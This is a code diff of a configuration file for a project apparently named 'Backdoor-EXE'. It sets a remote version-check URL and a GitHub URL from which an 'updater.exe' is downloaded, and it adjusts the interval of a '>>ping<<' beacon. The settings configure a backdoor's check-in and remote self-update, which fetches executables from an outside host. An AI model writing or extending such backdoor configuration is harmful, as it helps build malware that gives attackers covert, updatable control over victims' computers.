@@ -8,16 +8,14 @@ SERVER_PORT = None
 
 
 # version manager config
-# TODO: Fix after the first commit
-RAW_VERSION_URL = ""
-EXE_ASSET_URL = ""
-EXE_NAME = "monitor.exe"
-VERSION_FILE = "version.txt"
-HTTP_TIMEOUT = 15
+CURRENT_VERSION = "1.0.0"
+RAW_VERSION_URL = "https://raw.githubusercontent.com/Prithvi824/Backdoor-EXE/refs/heads/main/version.txt"
+HTTP_TIMEOUT = 60
+UPDATER_EXE_URL = "https://github.com/Prithvi824/Backdoor-EXE/raw/refs/heads/main/dist/updater.exe"
 
 
 # ping config
-PING_INTERVAL = 60  # seconds
+PING_INTERVAL = 180  # seconds
 PING_MESSAGE = b">>ping<<"
 
 # check if all the variables are populated
